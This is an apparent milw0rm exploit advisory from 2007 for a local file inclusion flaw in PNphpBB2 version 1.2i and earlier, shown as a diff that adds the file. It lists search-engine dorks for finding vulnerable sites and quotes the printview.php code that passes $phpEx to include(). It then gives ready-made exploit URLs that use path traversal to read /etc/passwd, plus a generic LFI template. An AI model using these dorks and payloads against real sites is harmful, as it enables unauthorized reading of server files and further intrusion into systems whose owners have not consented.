@@ -1,0 +1,31 @@
+.-----------------------------------------------------------------------------.
+|  vuln.: PNphpBB2 <= 1.2i (printview.php phpEx) Local File Inclusion Vuln.   |
+|  download: http://www.pnphpbb.com/                                          |
+|  dorks: Powered by PNphpBB2 / Powered por PNphpBB2                          |
+|         inurl:"index.php?name=PNphpBB2"                                     |
+|                                                                             |
+|  author: irk4z@yahoo.pl                                                     |
+|  homepage: http://irk4z.wordpress.com/                                      |
+|                                                                             |
+|  greets to: str0ke, wacky, polish under ;]                                  |
+'-----------------------------------------------------------------------------'
+
+# code:
+
+  /printview.php:
+  ...
+      define('IN_PHPBB', true);
+      $ModName = basename( dirname( __FILE__ ) );
+      $phpbb_root_path = './modules/' . $ModName . '/';
+      include($phpbb_root_path . 'extension.inc');
+      include($phpbb_root_path . 'common.'.$phpEx);
+  ...
+  
+  LFI in $phpEx :D:D:D
+  
+# sploit:
+
+http://[host]/[path]/modules/PNphpBB2/printview.php?phpEx=/../../../../../../../etc/passwd
+http://[host]/[path]/modules/PNphpBB2/printview.php?phpEx=[ LFI ]
+
+# milw0rm.com [2007-12-26]
